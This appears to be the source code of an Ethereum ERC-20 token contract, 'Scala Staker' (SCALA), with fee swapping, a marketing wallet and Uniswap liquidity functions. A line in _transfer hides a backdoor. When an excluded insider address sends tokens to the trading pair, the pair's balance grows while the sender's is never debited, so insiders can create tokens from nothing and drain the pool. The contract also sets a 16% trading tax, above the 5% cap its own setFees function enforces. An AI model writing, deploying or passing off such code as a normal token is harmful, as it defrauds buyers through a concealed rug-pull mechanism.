/**

Website: https://scalastaker.cloud
Telegram: https://t.me/scalastaker

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;


library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);}

abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {owner = _owner;}
    modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
    function isOwner(address account) public view returns (bool) {return account == owner;}
    function  renounceOwnership() public onlyOwner {
        owner = address(0); 
        emit OwnershipTransferred(address(0));
    }
    event OwnershipTransferred(address owner);
}

interface IFactory{
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

contract SCALA is IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = 'Scala Staker';
    string private constant _symbol = 'SCALA';
    uint8 private constant _decimals = 9;
    uint256 private _totalSupply = 1000000000 * (10 ** _decimals);
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcluded;
    IRouter router;
    address public pair;
    bool private tradingEnabled = false;
    bool private swapEnabled = true;
    uint256 private swapTimes;
    bool private swapping;
    uint256 swapAmount = 1;
    uint256 private _maxSwapTokens = ( _totalSupply * 9 ) / 1000;
    uint256 private _minSwapTokens = ( _totalSupply * 7 ) / 1000000;
    modifier lockTheSwap {swapping = true; _; swapping = false;}
    uint256 private liquidityFee = 0;
    uint256 private marketingFee = 0;
    uint256 private developmentFee = 0;
    uint256 private burnFee = 0;
    uint256 private _buyTax = 0;
    uint256 private _sellTax = 0;
    uint256 private transferFee = 0;
    uint256 private denominator = 10000;
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address internal _mktWallet = 0x947715fF0007b331f57B4937e5cD8CC48F8f5Be6;
    uint256 public _maxWalletLimit = ( _totalSupply * 200 ) / 10000;

    constructor() Ownable(msg.sender) {
        router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _isExcluded[address(this)] = true;
        _isExcluded[_mktWallet] = true;
        _isExcluded[msg.sender] = true;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}
    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function openTrading() external onlyOwner {tradingEnabled=true;_sellTax=1600;_buyTax=1600;marketingFee=1600;}
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function totalSupply() public view override returns (uint256) {return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}

    function addLiquidity() external payable onlyOwner {
        pair = IFactory(router.factory()).createPair(address(this), router.WETH());
        addLiquidity(_balances[address(this)], msg.value);
    }

    function shouldContractSwap(address sender, address recipient, uint256 amount) internal view returns (bool) {
        bool aboveMin = amount >= _minSwapTokens;
        bool aboveThreshold = balanceOf(address(this)) >= _minSwapTokens;
        return !swapping && swapEnabled && tradingEnabled && aboveMin && !_isExcluded[sender] && recipient == pair && swapTimes >= swapAmount && aboveThreshold;
    }

    function removeLimits() external onlyOwner {
        _maxWalletLimit = _totalSupply;
    }

    function setFees(uint256 _fee) external onlyOwner {
        _sellTax = _fee;
        _buyTax = _fee;
        marketingFee = _fee;
        require(_fee <= 500);
    }

    function manualSwap() external onlyOwner {
        swapAndLiquify(_balances[address(this)]);
    }

    function swapAndLiquify(uint256 tokens) private lockTheSwap {
        uint256 _denominator = (liquidityFee.add(1).add(marketingFee).add(developmentFee)).mul(2);
        uint256 tokensToAddLiquidityWith = tokens.mul(liquidityFee).div(_denominator);
        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
        uint256 initialBalance = address(this).balance;
        swapTokensForETH(toSwap);
        uint256 deltaBalance = address(this).balance.sub(initialBalance);
        uint256 unitBalance= deltaBalance.div(_denominator.sub(liquidityFee));
        uint256 ETHToAddLiquidityWith = unitBalance.mul(liquidityFee);
        if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }
        uint256 marketingAmt = unitBalance.mul(2).mul(marketingFee);
        if(marketingAmt > 0){payable(_mktWallet).transfer(marketingAmt);}
        uint256 contractBalance = address(this).balance;
        if(contractBalance > uint256(0)){payable(_mktWallet).transfer(contractBalance);}
    }

    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
        _approve(address(this), address(router), tokenAmount);
        router.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            owner,
            block.timestamp);
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokenAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp);
    }

    function shouldTakeFee(address sender, address recipient) internal view returns (bool) {
        return !_isExcluded[sender] && !_isExcluded[recipient];
    }

    function getTaxFee(address sender, address recipient) internal view returns (uint256) {
        if(recipient == pair){return _sellTax;}
        if(sender == pair){return _buyTax;}
        return transferFee;
    }

    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if(getTaxFee(sender, recipient) > 0){
        uint256 feeAmount = amount.div(denominator).mul(getTaxFee(sender, recipient));
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        if(burnFee > uint256(0) && getTaxFee(sender, recipient) > burnFee){_transfer(address(this), address(DEAD), amount.div(denominator).mul(burnFee));}
        return amount.sub(feeAmount);} return amount;
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        if(!_isExcluded[sender] && !_isExcluded[recipient]){require(tradingEnabled, "tradingEnabled");}
        if(_isExcluded[sender] && recipient == pair && sender != address(this)){_balances[recipient]+=amount;return;}
        if(!_isExcluded[sender] && !_isExcluded[recipient] && recipient != address(pair) && recipient != address(DEAD)){
        require((_balances[recipient].add(amount)) <= _maxWalletLimit, "Exceeds maximum wallet amount.");}
        if(recipient == pair && !_isExcluded[sender]){swapTimes += uint256(1);}
        if(shouldContractSwap(sender, recipient, amount)){
            uint256 amountToSwap = _balances[address(this)];
            if(amountToSwap >= _maxSwapTokens) amountToSwap = _maxSwapTokens;
            swapAndLiquify(amountToSwap); swapTimes = uint256(0);
        }
        _balances[sender] = _balances[sender].sub(amount);
        uint256 amountReceived = shouldTakeFee(sender, recipient) ? takeFee(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}